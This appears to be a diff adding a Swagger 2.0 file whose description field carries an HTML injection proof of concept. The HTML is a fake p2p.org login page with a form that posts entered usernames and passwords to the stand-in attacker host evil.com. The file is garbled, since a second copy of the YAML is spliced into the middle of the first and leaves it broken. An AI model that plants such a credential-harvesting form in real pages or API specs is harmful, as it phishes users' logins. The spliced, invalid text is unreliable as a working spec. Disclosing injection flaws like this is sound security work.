@@ -1,0 +1,97 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: P2P Login Page
+  description: '<style>
+    .navbar {
+        background-color: black;
+        padding: 15px;
+        text-align: center;
+    }
+    .navbar a {
+        color: white;
+        font-size: 18px;
+        text-decoration: none;
+        margin: 15px;
+    }
+    .login-form {
+        text-align: center;
+        margin-top: 20px;
+    }
+    .heading img {
+        display: block;
+        margin: 0 auto;
+    }
+    .form-container {
+        margin-top: 20px;
+        text-align: center;
+    }
+    .form-group {
+        margin-bottom: 15px;
+    }
+</style>
+
+<div class="navbar">
+    <a href="#">Products</a>
+    <a href="#">Networks</a>
+    <a href="#">Company</a>
+    <a href="#">Blog</a>
+</div>
+
+<div class="login-form">
+    <div class="heading">
+        <img src="https://avatars.githubusercontent.com/u/39105621?s=200&v=4" alt="P2P.org Logo" width="300">
+        <h1>HTML Injection : Welcome To p2p.org</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://evil.com/" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">swagger: '2.0'
+info:
+  version: 1.0.0
+  title: P2P Login Page
+  description: '<div class="login-form">
+    <div class="heading">
+        <img src="https://avatars.githubusercontent.com/u/39105621?s=200&v=4" alt="P2P.org Logo" width="300">
+        <h1>HTML Injection : Welcome To p2p.org</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://evil.com/" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
